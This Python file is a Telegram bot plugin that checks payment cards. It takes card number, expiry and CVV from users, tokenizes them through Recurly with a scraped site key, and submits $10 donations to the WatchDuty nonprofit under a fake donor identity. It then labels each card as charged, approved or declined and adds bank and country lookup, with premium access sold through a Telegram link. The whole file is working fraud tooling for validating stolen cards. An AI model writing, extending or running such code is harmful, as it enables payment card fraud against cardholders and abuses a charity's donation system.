"""
Recurly Gateway Plugin (WatchDuty)
Commands: /rc, .rc, !rc, $rc
Charge: $10
"""

import requests
import json
import time
import asyncio
from pyrogram import Client, filters
from pyrogram.enums import ParseMode

import sys
sys.path.append('..')
from utils.card_utils import extract_card_info
from utils.bin_lookup import get_bin_info
from utils.response_formatter import get_response_keyboard
from utils.gateway_middleware import validate_card_with_luhn

# Plugin metadata
PLUGIN_INFO = {
    'name': 'Recurly',
    'commands': ['rc'],
    'prefixes': ['.', '/', '!', '$'],
    'description': 'Recurly payment gateway (WatchDuty) - $10 charge',
    'type': 'charge',
    'status': 'active'
}

def categorize_recurly_response(content, url):
    """Categorize Recurly response"""
    content_lower = content.lower()
    url_lower = url.lower()
    
    # Check for success patterns
    thank_you_patterns = ['thank-you', 'thank_you', 'thankyou', 'payment-success', 
                         'payment_success', 'receipt', 'confirmation', 'success']
    
    for pattern in thank_you_patterns:
        if pattern in url_lower or pattern in content_lower:
            return 'charged', 'Payment Successful - Order Placed'
    
    # Check for approval keywords
    approved_keywords = ['insufficient', 'funds', 'money', 'cvv', 'cvc', 
                        'security code', 'avs', '3d']
    for keyword in approved_keywords:
        if keyword in content_lower:
            return 'approved', content[:100]
    
    # Check if it's an error from Recurly
    if 'incorrect' in content_lower or 'invalid' in content_lower:
        return 'declined', content[:100]
    
    return 'declined', content[:100] if content else 'Payment declined'

def get_status_emoji(category):
    """Get emoji for status category"""
    emoji_map = {
        'charged': 'Charged 🔥',
        'approved': '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅',
        'declined': '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌'
    }
    return emoji_map.get(category, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌')

def format_recurly_response(card_info, response_message, bin_info, execution_time, category):
    """Format Recurly response for Telegram"""
    card, month, year, cvv = card_info
    cc_display = f"`{card}|{month}|{year}|{cvv}`"
    
    status_text = get_status_emoji(category)
    
    response_text = f"{status_text}\n\n"
    response_text += f"㊕ 𝗖𝗖 ⇾ {cc_display}\n"
    response_text += f"㊕ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Recurly $10\n"
    response_text += f"㊕ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}\n\n"
    
    # Add BIN info if available
    if bin_info:
        response_text += f"㊕ 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('vendor', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}\n"
        response_text += f"㊕ 𝗕𝗮𝗻𝗸: {bin_info.get('bank_name', 'N/A')}\n"
        response_text += f"㊕ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'N/A')} {bin_info.get('flag', '')}\n\n"
    
    response_text += f"㊕ 𝗧𝗼𝗼𝗸 {execution_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    
    return response_text

class RecurlyGateway:
    def __init__(self):
        self.base_headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'accept-language': "en-GB,en-US;q=0.9,en;q=0.8",
            'priority': "u=1, i"
        }
    
    def get_authorization_token(self, card, month, year, cvv):
        """Get Recurly authorization token"""
        url = "https://api.recurly.com/js/v1/token"
        
        payload = {
            'first_name': "Charles",
            'last_name': "Walgren",
            'postal_code': "10001",
            'number': card,
            'browser[color_depth]': "24",
            'browser[java_enabled]': "false",
            'browser[language]': "en-GB",
            'browser[referrer_url]': "https://app.watchduty.org/donate/billing_info",
            'browser[screen_height]': "918",
            'browser[screen_width]': "412",
            'browser[time_zone_offset]': "-180",
            'browser[user_agent]': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'month': month,
            'year': year,
            'cvv': cvv,
            'version': "4.41.1",
            'key': "ewr1-Y0SHDDwRnzoy5NswF6H36h",
            'deviceId': "BcCG0vZ1BSjXChqT",
            'sessionId': "VsqF1sum8HebyHjA",
            'instanceId': "pBFpOtayEDixEBFo"
        }
        
        headers = self.base_headers.copy()
        headers.update({
            'origin': "https://api.recurly.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'sec-fetch-storage-access': "none",
            'referer': "https://api.recurly.com/js/v1/field.html"
        })
        
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=30)
            
            if response.status_code == 200:
                try:
                    token_data = response.json()
                    if 'id' in token_data:
                        return {'type': 'token', 'value': token_data['id']}, None
                except:
                    pass
            
            if response.status_code == 400:
                try:
                    error_data = response.json()
                    if 'error' in error_data and 'message' in error_data['error']:
                        error_msg = error_data['error']['message']
                        return None, error_msg
                except:
                    pass
            
            return None, "Failed to get authorization token"
        except Exception as e:
            return None, f"Error: {str(e)}"
    
    def process_donation(self, authorization_token):
        """Process donation with WatchDuty"""
        url = "https://api.watchduty.org/api/v1/recurly_integration/initial_donation/"
        
        payload = {
            "client_token": "jw59u2f4qiaz0k681pkp0j",
            "donation_amount": 10,
            "donation_renews": False,
            "first_name": "Charles",
            "last_name": "Walgren",
            "email": "charleswalgren9@gmail.com",
            "opt_in_to_updates": False,
            "authorization_token": authorization_token
        }
        
        headers = self.base_headers.copy()
        headers.update({
            'Accept': "application/json, text/plain, */*",
            'Content-Type': "application/json",
            'x-git-tag': "2026.2.5",
            'x-app-version': "2026.2.5",
            'x-app-is-native': "false",
            'origin': "https://app.watchduty.org",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://app.watchduty.org/",
            'accept-language': "en"
        })
        
        try:
            session = requests.Session()
            response = session.post(url, data=json.dumps(payload), headers=headers, 
                                  allow_redirects=False, timeout=30)
            
            final_response = response
            final_content = response.text
            final_url = response.url
            
            # Handle redirects
            if response.status_code in [301, 302, 303, 307, 308] and 'Location' in response.headers:
                redirect_url = response.headers['Location']
                redirect_response = session.get(redirect_url, headers=headers, allow_redirects=True)
                final_response = redirect_response
                final_content = redirect_response.text
                final_url = redirect_response.url
            
            return {
                'status_code': final_response.status_code,
                'content': final_content,
                'url': final_url
            }
        except Exception as e:
            return {
                'status_code': 0,
                'content': f"Error: {str(e)}",
                'url': ""
            }
    
    async def check_card(self, card, month, year, cvv):
        """Main function to check card through Recurly"""
        start_time = time.time()
        
        try:
            # Step 1: Get authorization token
            auth_result, error = self.get_authorization_token(card, month, year, cvv)
            
            if error:
                return None, error, time.time() - start_time
            
            if not auth_result or auth_result['type'] != 'token':
                return None, "Failed to get token", time.time() - start_time
            
            # Step 2: Process donation
            donation_result = self.process_donation(auth_result['value'])
            
            execution_time = time.time() - start_time
            return donation_result, None, execution_time
            
        except Exception as e:
            execution_time = time.time() - start_time
            return None, f"Error: {str(e)}", execution_time

# Register command handlers
def setup(app: Client):
    """Setup function called when plugin is loaded"""
    
    @app.on_message(filters.command(["rc"], prefixes=[".", "/", "!", "$"]))
    async def rc_command(client, message):
        """Handle /rc command"""
        from utils.admin import check_banned, check_maintenance, check_gateway_access, forward_to_admin_if_enabled
        from utils.database import db
        
        user_id = message.from_user.id
        username = message.from_user.username
        
        # Add user to database
        db.add_user(user_id, username)
        
        # Check if banned
        if await check_banned(client, message):
            return
        
        # Check if maintenance
        if await check_maintenance(client, message):
            return
        
        # Check gateway access
        can_access, reason = await check_gateway_access(user_id, 'rc')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
                from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
                keyboard = InlineKeyboardMarkup([[
                    InlineKeyboardButton("Buy", url="https://t.me/themigel")
                ]])
                await message.reply_text(
                    "<b>Only available to Premium users !</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=keyboard
                )
                return
        
        # Extract card info from message or reply
        text = None
        if message.reply_to_message:
            text = message.reply_to_message.text
        elif message.text:
            command_text = message.text.strip()
            command_parts = command_text.split(maxsplit=1)
            if len(command_parts) > 1:
                text = command_parts[1]
        
        if not text:
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» 𝙍𝙚𝙘𝙪𝙧𝙡𝙮 - CHARGE

〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Recurly $10

<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /rc cc|month|year|cvc"""
            await message.reply_text(resp, parse_mode=ParseMode.HTML)
            return
        
        # Extract card info
        card_info = extract_card_info(text)
        if not card_info:
            await message.reply_text("❌ Invalid card format. Use: cc|month|year|cvv")
            return
        
        # Validate card with Luhn algorithm
        if not await validate_card_with_luhn(card_info, "Recurly $10", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'rc')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card
        gateway = RecurlyGateway()
        donation_result, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'rc')
        
        # Get BIN info
        bin_info = get_bin_info(card)
        
        if error:
            # Error occurred
            response_text = format_recurly_response(
                card_info=(card, month, year, cvv),
                response_message=error,
                bin_info=bin_info,
                execution_time=execution_time,
                category='declined'
            )
        else:
            # Parse response
            category, response_message = categorize_recurly_response(
                donation_result['content'], 
                donation_result['url']
            )
            
            response_text = format_recurly_response(
                card_info=(card, month, year, cvv),
                response_message=response_message,
                bin_info=bin_info,
                execution_time=execution_time,
                category=category
            )
        
        # Update progress message with result
        keyboard = get_response_keyboard()
        await progress_msg.edit_text(
            response_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=keyboard
        )
    
    print("✅ Recurly gateway commands registered")
